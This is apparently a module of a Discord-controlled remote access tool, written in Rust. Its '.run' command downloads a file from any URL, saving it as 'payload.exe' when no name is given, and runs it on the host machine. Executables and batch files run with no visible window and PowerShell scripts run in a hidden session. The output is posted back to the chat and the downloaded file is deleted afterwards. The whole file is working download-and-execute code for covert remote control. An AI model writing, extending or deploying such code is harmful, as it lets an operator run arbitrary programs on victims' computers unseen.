use crate::prelude::*;
use std::env;
use std::path::Path;
use std::process::Stdio;
use tokio::process::Command;
use powershell_script::PsScriptBuilder;

const CREATE_NO_WINDOW: u32 = 0x08000000;

#[poise::command(prefix_command, aliases("exec", "execute"))]
pub async fn run(
    ctx: PoiseContext<'_>,
    #[description = "URL or local path"]
    #[rest]
    args: Option<String>,
) -> Result<(), Error> {
    let args = match args {
        Some(a) => a,
        None => {
            ctx.say("Usage: `.run <url|path> [args...]`").await?;
            return Ok(());
        }
    };

    let parsed = crate::commands::Arguments::parse_quoted_args(&args);
    if parsed.is_empty() {
        ctx.say("Usage: `.run <url|path> [args...]`").await?;
        return Ok(());
    }

    let target = &parsed[0];
    let extra_args = parsed[1..].join(" ");

    let is_url = target.starts_with("http://") || target.starts_with("https://");
    
    let (file_path, filename, is_temp) = if is_url {
        let filename = target.split('/').last().unwrap_or("payload.exe").to_string();
        let temp_dir = env::temp_dir();
        let file_path = temp_dir.join(&filename);

        let reply = ctx.say(format!("Downloading `{}`...", filename)).await?;
        
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .timeout(std::time::Duration::from_secs(60))
            .build()?;

        let response = match client.get(target).send().await {
            Ok(resp) => resp,
            Err(e) => {
                reply.edit(ctx, poise::CreateReply::default()
                    .content(format!("ERROR: Download failed: {}", e))).await?;
                return Ok(());
            }
        };

        if !response.status().is_success() {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("ERROR: HTTP {}", response.status()))).await?;
            return Ok(());
        }

        let bytes = response.bytes().await?;
        tokio::fs::write(&file_path, &bytes).await?;

        reply.edit(ctx, poise::CreateReply::default()
            .content(format!("Downloaded `{}` ({} bytes)", filename, bytes.len()))).await?;

        (file_path, filename, true)
    } else {
        let path = Path::new(target);
        if !path.exists() {
            ctx.say(format!("ERROR: File not found: `{}`", target)).await?;
            return Ok(());
        }
        let filename = path.file_name().unwrap_or_default().to_string_lossy().to_string();
        (path.to_path_buf(), filename, false)
    };

    let reply = ctx.say(format!("Executing `{}`...", filename)).await?;
    let file_path_str = file_path.to_string_lossy().to_string();
    let ext = filename.to_lowercase();

    if ext.ends_with(".ps1") {
        let launcher = format!("& '{}' {}", file_path_str, extra_args);
        
        let result = tokio::task::spawn_blocking(move || {
            PsScriptBuilder::new()
                .no_profile(true)
                .non_interactive(true)
                .hidden(true)
                .print_commands(false)
                .build()
                .run(&launcher)
        }).await;
        
        let embed = match result {
            Ok(Ok(output)) => {
                let stdout = output.stdout().unwrap_or_default();
                let output_preview = if stdout.len() > 1500 {
                    format!("{}...", &stdout[..1500])
                } else { stdout.clone() };
                serenity::CreateEmbed::new()
                    .title(format!("Executed: {}", filename))
                    .description(format!("```\n{}\n```", output_preview))
                    .color(0x2ecc71)
            }
            Ok(Err(e)) => serenity::CreateEmbed::new()
                .title("Execution Failed")
                .description(format!("```\n{}\n```", e))
                .color(0xe74c3c),
            Err(e) => serenity::CreateEmbed::new()
                .title("Execution Error")
                .description(format!("{}", e))
                .color(0xe74c3c),
        };

        reply.edit(ctx, poise::CreateReply::default().content("").embed(embed)).await?;
    } else {
        // EXE, BAT, CMD, or other
        let result = if ext.ends_with(".bat") || ext.ends_with(".cmd") {
            let mut cmd = Command::new("cmd");
            cmd.args(["/c", &file_path_str]);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        } else {
            let mut cmd = Command::new(&file_path);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        };

        match result {
            Ok(child) => {
                match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    child.wait_with_output()
                ).await {
                    Ok(Ok(output)) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let exit_code = output.status.code().unwrap_or(-1);

                        let mut desc = String::new();
                        if !stdout.trim().is_empty() {
                            let preview = if stdout.len() > 1000 { &stdout[..1000] } else { &stdout };
                            desc.push_str(&format!("**Output:**\n```\n{}\n```\n", preview));
                        }
                        if !stderr.trim().is_empty() {
                            let preview = if stderr.len() > 500 { &stderr[..500] } else { &stderr };
                            desc.push_str(&format!("**Errors:**\n```\n{}\n```", preview));
                        }

                        let embed = serenity::CreateEmbed::new()
                            .title(format!("Executed: {}", filename))
                            .field("Exit Code", exit_code.to_string(), true)
                            .description(if desc.is_empty() { "No output".to_string() } else { desc })
                            .color(if exit_code == 0 { 0x2ecc71 } else { 0xf39c12 });

                        reply.edit(ctx, poise::CreateReply::default().content("").embed(embed)).await?;
                    }
                    Ok(Err(e)) => {
                        reply.edit(ctx, poise::CreateReply::default()
                            .content(format!("Started but failed to get output: {}", e))).await?;
                    }
                    Err(_) => {
                        reply.edit(ctx, poise::CreateReply::default()
                            .content(format!("Started `{}` (running in background)", filename))).await?;
                    }
                }
            }
            Err(e) => {
                reply.edit(ctx, poise::CreateReply::default()
                    .content(format!("ERROR: Failed to execute: {}", e))).await?;
            }
        }
    }

    if is_temp {
        let cleanup_path = file_path.clone();
        tokio::spawn(async move {
            tokio::time::sleep(std::time::Duration::from_secs(30)).await;
            let _ = tokio::fs::remove_file(cleanup_path).await;
        });
    }

    Ok(())
}
